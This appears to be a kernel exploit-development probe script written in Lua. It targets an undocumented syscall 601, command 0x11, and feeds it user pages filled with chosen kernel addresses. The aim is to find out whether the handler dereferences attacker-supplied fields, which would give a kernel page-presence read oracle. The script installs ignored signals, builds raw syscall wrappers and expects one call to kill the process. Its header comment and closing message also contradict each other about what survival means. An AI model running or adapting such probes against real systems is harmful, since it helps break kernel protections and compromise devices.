-- CRASH_CLASS: HIGH -- one call in the sequence is expected to kill the process; every call prints
-- its line before it is made, so a kill identifies itself and the rest is left for a relaunch.
-- PROBE 1394a: 601 cmd 0x11 dereferences the CONTENTS of arg2 as a kernel pointer.
--
-- The two previous runs pinned the shape down:
--   1383b: `601(0x11, 0, A5page)`  -> process dies
--   1393a: `601(0x11, buf, anything)` -> EINVAL(22), so arg1 must be 0
--          `601(0x11, 0, K1)`       -> EFAULT(14), so arg2 itself is range-checked as a USER pointer
--   and 1393a's `601(0x11, buf, U(page))` -> EINVAL again, never reaching the deref
--
-- Together those say: arg2 must be a valid user page, arg1 must be null, and then the body reads a
-- field out of our page and uses it as an address. With the page filled 0xA5 that address is
-- 0xA5A5A5A5A5A5A5A5, which cannot be dereferenced, so the process dies - a supervisor fault on
-- attacker-supplied data, which is the classic shape of a handler that trusts a struct field.
--
-- So this probe fills the page with a VALID kernel address instead. If the body dereferences it,
-- the access succeeds and the call returns normally, where 0xA5 killed; if the page's fields are
-- never used as addresses, every fill behaves like 0xA5 and dies.
--
--   ALL_K1 returns 0, ALL_ABS dies  -> the dereference is real and *every* page presence is
--                                      observable at an address we choose: a kernel read oracle.
--   every fill dies                -> arg2's fields are not addresses; 0x11 is a dead end.
--
-- Order: mapped image, mapped stub, absent page, null page, 0xA5 page last (the expected kill).
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1383b_sys601_shape_matrix2_20261109_135948.txt
--   results/phase35_dead_end_reruns/1393a_sys601_cmd11_kernel_arg2_20261109_141450.txt
--   results/1331a_20261109_141053.txt (this boot's present/absent kernel map)
--   docs/MDBG_601_COMMAND_MAP_14_10.md

print("=== PROBE 1394a: 601 0x11 STRUCT-FIELD DEREFERENCE ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function hex(v) v = v % 4294967296 return string.format("%08X", v) end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function UA(v) if type(v) == "string" then return uint64(v) end return uint64(v) end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
local ign = 0
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    local ok, rv = pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
    if ok and N(rv) == 0 then ign = ign + 1 end
end
print(string.format("[0] SIG_IGN installed on %d/10 signals", ign))

-- one 0x1000 page per fill pattern, so a kill cannot leave a page half-painted
local function mkpage(hi, lo)
    local p = memory.alloc(0x1000)
    for i = 0, 0xFFF, 8 do
        pcall(function() memory.write_dword(p + i, lo) end)
        pcall(function() memory.write_dword(p + i + 4, hi) end)
    end
    return N(p)
end
local P_K1  = mkpage(0xFFFFFFFF, 0xC1000000)   -- image base, present this boot
local P_K3  = mkpage(0xFFFFFFFF, 0xC0000000)   -- stub page, present
local P_ABS = mkpage(0xFFFFFFFF, 0xD0000000)   -- absent
local P_NUL = mkpage(0x00000000, 0x00000000)
local P_A5  = mkpage(0xA5A5A5A5, 0xA5A5A5A5)

local function canary()
    local ok = pcall(function() memory.write_dword(P_A5 + 0xFF0, 0xC0DE) end)
    if ok and rd(P_A5 + 0xFF0) == 0xC0DE then return true end
    return false
end
print(string.format("[0] canary %s", canary() and "ok" or "FAILED"))

print("")
print("[A] 601(0x11, 0, page) with the page filled by one value")
local function t(name, page)
    print(string.format("  -> 601(0x11, 0, %s)", name))
    local ok, rv = pcall(function()
        return mk(601)(uint64(0x11), uint64(0), uint64(page), uint64(0), uint64(0), uint64(0))
    end)
    if not ok then print("  <- EXC"); return false end
    print(string.format("  <- rv=%d %s", N(rv), es()))
    return true
end

if not t("K1(image)", P_K1) then print("[A] died on K1 - the field is not a usable kernel address"); print("=== PROBE 1394a INCOMPLETE ==="); return end
if not t("K3(stub)", P_K3) then print("[A] died on K3"); print("=== PROBE 1394a INCOMPLETE ==="); return end
if not t("ABS(absent)", P_ABS) then print("[A] died on the absent page - the dereference is real, this is a presence oracle"); print("=== PROBE 1394a INCOMPLETE ==="); return end
if not t("NULL", P_NUL) then print("[A] died on the null page"); print("=== PROBE 1394a INCOMPLETE ==="); return end
if not t("A5(baseline)", P_A5) then print("[A] died on A5 - as 1383b predicted, and K1 survived where A5 did not"); print("=== PROBE 1394a INCOMPLETE ==="); return end

print("")
print("[B] every fill survived, which means arg2's contents are not dereferenced by 0x11")
print(string.format("[C] canary at the end: %s", canary() and "ok" or "FAILED"))
print("=== PROBE 1394a COMPLETE ===")
